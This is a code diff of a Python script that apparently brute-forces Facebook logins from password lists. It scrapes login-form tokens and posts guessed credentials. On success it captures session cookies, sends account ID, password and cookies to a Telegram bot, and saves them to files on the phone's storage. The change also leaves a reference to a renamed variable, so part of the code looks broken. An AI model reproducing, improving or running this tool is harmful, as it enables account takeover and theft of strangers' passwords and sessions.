@@ -1669,52 +1669,58 @@ def __MTDSIX__(ids, names, passlist, total_ids):
             warna = random.choice(my_color)
             session = requests.Session()
             free_fb = session.get('https://m.facebook.com').text
-            data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
-            headers ={
-            "authority": f'p.facebook.com',
-            "method": 'POST',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=0.9',
-            "cache-control": 'no-cache, no-store, must-revalidate',
-            "referer": f'https://p.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Chromium";v="90"',
-            "sec-ch-ua-mobile": '?0',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?1',
-            "pragma": 'no-cache',
-            "priority": 'u=1',
-            "cross-origin-resource-policy": 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": 'Mozilla/5.0 (Linux; Android 10; SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',}
+            data =  {
+    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+   "try_number":"0",
+   "unrecognized_tries":"0",
+   "email":ids,
+   "pass":pas,
+   "login":"Log In"}
+            headers ={'authority':'m.facebook.com',
+            'method': 'POST',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-encoding':'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,headers=headers).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = coki[65:80]
-                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {cid} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
+                print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}: {green}{pas}')
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
+                cek_apk(kuki)
                 oks.append(cid)
-                statusok = (f" {cid} | {pas} | {coki} ")
+                statusok = (f" {cid} | {pas} | {kuki} ")
                 requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/ZERO-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                 break
-            elif "User must verify their account" in lo:
+            elif "checkpoint" in log_cookies:
                 cps.append(ids)
-                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                print(f'\r\r{rad}[ZERO-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/ZERO-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
         loop += 1
     except pycurl.error as e:
-        time.sleep(10)
+        time.sleep(50)
     except Exception as e:
         pass
+
 
 os.system("clear")
 #Process()
